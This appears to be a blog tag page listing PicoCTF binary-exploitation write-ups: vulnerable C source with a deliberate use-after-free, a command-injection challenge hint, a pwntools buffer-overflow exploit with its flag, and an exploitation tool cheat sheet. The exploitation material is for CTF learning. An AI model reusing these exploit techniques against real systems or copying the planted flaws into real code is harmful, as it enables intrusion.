<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/pwn/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PWN"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>PWN | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/pwn/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/pwn/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PWN</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/>PicoCTF - Unsubscriptions Are Free</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---unsubscriptions-are-free>PicoCTF - Unsubscriptions Are Free
<a class=anchor href=#picoctf---unsubscriptions-are-free>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Heap Exploitation / Used After Free</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;ctype.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define FLAG_BUFFER 200
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define LINE_BUFFER_SIZE 20
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>	uintptr_t (<span style=color:#f92672>*</span>whatToDo)();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>username;
</span></span><span style=display:flex><span>} cmd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> choice;
</span></span><span style=display:flex><span>cmd <span style=color:#f92672>*</span>user;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>hahaexploitgobrrr</span>(){
</span></span><span style=display:flex><span> 	<span style=color:#66d9ef>char</span> buf[FLAG_BUFFER];
</span></span><span style=display:flex><span> 	FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span> 	fgets(buf,FLAG_BUFFER,f);
</span></span><span style=display:flex><span> 	fprintf(stdout,<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,buf);
</span></span><span style=display:flex><span> 	fflush(stdout);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>getsline</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>	getchar();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> line <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>100</span>), <span style=color:#f92672>*</span> linep <span style=color:#f92672>=</span> line;
</span></span><span style=display:flex><span>	size_t lenmax <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>, len <span style=color:#f92672>=</span> lenmax;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> c;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(line <span style=color:#f92672>==</span> NULL)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span>(;;) {
</span></span><span style=display:flex><span>		c <span style=color:#f92672>=</span> fgetc(stdin);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(c <span style=color:#f92672>==</span> EOF)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#f92672>--</span>len <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>			len <span style=color:#f92672>=</span> lenmax;
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> linen <span style=color:#f92672>=</span> realloc(linep, lenmax <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(linen <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>				free(linep);
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			line <span style=color:#f92672>=</span> linen <span style=color:#f92672>+</span> (line <span style=color:#f92672>-</span> linep);
</span></span><span style=display:flex><span>			linep <span style=color:#f92672>=</span> linen;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>((<span style=color:#f92672>*</span>line<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> c) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\n&#39;</span>)
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#f92672>*</span>line <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> linep;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doProcess</span>(cmd<span style=color:#f92672>*</span> obj) {
</span></span><span style=display:flex><span>	(<span style=color:#f92672>*</span>obj<span style=color:#f92672>-&gt;</span>whatToDo)();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>s</span>(){
</span></span><span style=display:flex><span> 	printf(<span style=color:#e6db74>&#34;OOP! Memory leak...%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,hahaexploitgobrrr);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Thanks for subsribing! I really recommend becoming a premium member!&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>p</span>(){
</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;Membership pending... (There&#39;s also a super-subscription you can also get for twice the price!)&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>m</span>(){
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Account created.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>leaveMessage</span>(){
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;I only read premium member messages but you can &#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;try anyways:&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> msg <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, msg, <span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>i</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> response;
</span></span><span style=display:flex><span>  	puts(<span style=color:#e6db74>&#34;You&#39;re leaving already(Y/N)?&#34;</span>);
</span></span><span style=display:flex><span>	scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>response);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(toupper(response)<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;Y&#39;</span>){
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Bye!&#34;</span>);
</span></span><span style=display:flex><span>		free(user);
</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Ok. Get premium membership please!&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>printMenu</span>(){
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;Welcome to my stream! ^W^&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;==========================&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(S)ubscribe to my channel&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(I)nquire about account deletion&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(M)ake an Twixer account&#34;</span>);
</span></span><span style=display:flex><span> 	puts(<span style=color:#e6db74>&#34;(P)ay for premium membership&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(l)eave a message(with or without logging in)&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;(e)xit&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>processInput</span>(){
</span></span><span style=display:flex><span>  scanf(<span style=color:#e6db74>&#34; %c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
</span></span><span style=display:flex><span>  choice <span style=color:#f92672>=</span> toupper(choice);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span>(choice){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;S&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(user){
</span></span><span style=display:flex><span> 		user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)s;
</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Not logged in!&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;P&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)p;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;I&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)i;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;M&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span> 	user<span style=color:#f92672>-&gt;</span>whatToDo <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)m;
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;===========================&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Registration: Welcome to Twixer!&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Enter your username: &#34;</span>);
</span></span><span style=display:flex><span>	user<span style=color:#f92672>-&gt;</span>username <span style=color:#f92672>=</span> getsline();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>   <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;L&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	leaveMessage();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;E&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Invalid option!&#34;</span>);
</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	  <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	setbuf(stdout, NULL);
</span></span><span style=display:flex><span>	user <span style=color:#f92672>=</span> (cmd <span style=color:#f92672>*</span>)malloc(<span style=color:#66d9ef>sizeof</span>(user));
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>		printMenu();
</span></span><span style=display:flex><span>		processInput();
</span></span><span style=display:flex><span>		<span style=color:#75715e>//if(user){
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			doProcess(user);
</span></span><span style=display:flex><span>		<span style=color:#75715e>//}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---vne/>PicoCTF - VNE</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/ctf/>CTF</a></div><p><h1 id=picoctf---vne>PicoCTF - VNE
<a class=anchor href=#picoctf---vne>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>System Environment
Command Injection</p><h2 id=description--hint>Description & Hint
<a class=anchor href=#description--hint>#</a></h2><p>We&rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named &ldquo;bin&rdquo; once connected. Login as ctf-player with the password, d137d16e</p><ul><li>Hint 1: Have you checked the content of the /root folder</li><li>Hint 2: Find a way to add more instructions to the ls</li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA Main Function</p><a href=/security/practice/picoctf/pwn/picoctf---vne/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---x-sixty-what/>PicoCTF - x-sixty-what</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---x-sixty-what>PicoCTF - x-sixty-what
<a class=anchor href=#picoctf---x-sixty-what>#</a></h1><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp="></code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>，發現應該return到0x40123b，不太知道為甚麼</p><ul><li><p>第一張是return 2 0x401236
<img src=https://hackmd.io/_uploads/Bk2PZ_0ch.png alt></p></li><li><p>第二張是return 2 0x40123b
<img src=https://hackmd.io/_uploads/SymO-uAqn.png alt></p></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li>用動態的方式看offset
$$
0x7fffffffd758 - 0x00007fffffffd710 = 0x48
$$</li></ol><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

r = remote(&#39;saturn.picoctf.net&#39;, 58166)
# r = process(&#39;./vuln&#39;)
context.arch = &#39;amd64&#39;

raw_input()
print(r.recvline().strip().decode())

payload = b&#39;a&#39;*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()
</code></pre><p>Flag: <code>picoCTF{b1663r_15_b3773r_e79d5a75}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://ctftime.org/writeup/33199>x-sixty-what WP</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p><a href=/security/practice/picoctf/pwn/picoctf---x-sixty-what/>...</a></p></article><article class="markdown book-post"><h2><a href=/tools/ctf/pwn-overview/>PWN Overview</a></h2><div class=text-small><a href=/tags/pwn/>PWN</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/tools/>Tools</a></div><p><h1 id=pwn-overview>PWN Overview
<a class=anchor href=#pwn-overview>#</a></h1><p>:::spoiler TOC
[TOC]
:::</p><h2 id=tools-cheat>Tools Cheat
<a class=anchor href=#tools-cheat>#</a></h2><ul><li>Commonly Used Commands<pre tabindex=0><code class=language-bash! data-lang=bash!>$ file {file path}
$ checksec {file path} # sudo apt-get install checksec
$ objdump -M intel -d {file path} | less
$ gdb {file path} # sudo apt-get install gdb
$ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等
$ readelf -S {file path} # 只查看sections&#39; header
$ ldd {file path} # to check what libraries the file used
</code></pre></li><li>Command Used Tools / Plugin<ul><li><a href=https://github.com/longld/peda>gdb-peda</a><pre tabindex=0><code class=language-bash! data-lang=bash!>$ git clone https://github.com/longld/peda.git ~/peda
$ echo &#34;source ~/peda/peda.py&#34; &gt;&gt; ~/.gdbinit
</code></pre></li><li><a href=https://github.com/radareorg/radare2>radare2</a><pre tabindex=0><code class=language-bash! data-lang=bash!>$ git clone https://github.com/radare/radare2.git
$ sudo apt install build-essential # just for wsl
$ sudo ./radare2/sys/install.sh
</code></pre></li><li><a href=https://www.exploit-db.com/shellcodes>Exploit DB - Shell Code</a>：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對</li><li><a href=https://github.com/JonathanSalwan/ROPgadget>ROPgadget</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt install python3-pip
</span></span><span style=display:flex><span>$ sudo -H python3 -m pip install ROPgadget
</span></span><span style=display:flex><span>$ ROPgadget --help
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># For using</span>
</span></span><span style=display:flex><span>$ ROPgadget --binary <span style=color:#f92672>{</span>executed file<span style=color:#f92672>}</span> | grep <span style=color:#e6db74>&#39;pop rax.*ret&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Or</span>
</span></span><span style=display:flex><span>$ ROPgadget --binary <span style=color:#f92672>{</span>executed file<span style=color:#f92672>}</span> --only <span style=color:#e6db74>&#34;pop|ret|syscall&#34;</span> &gt; rop_gadget.txt
</span></span><span style=display:flex><span>$ ROPgadget --binary <span style=color:#f92672>{</span>executed file<span style=color:#f92672>}</span> --only <span style=color:#e6db74>&#34;pop|ret|syscall&#34;</span> --multibr &gt; rop_gadget.txt <span style=color:#75715e># multibr是multi bransh允許多分支的gadget</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 取得特定string的gadget</span>
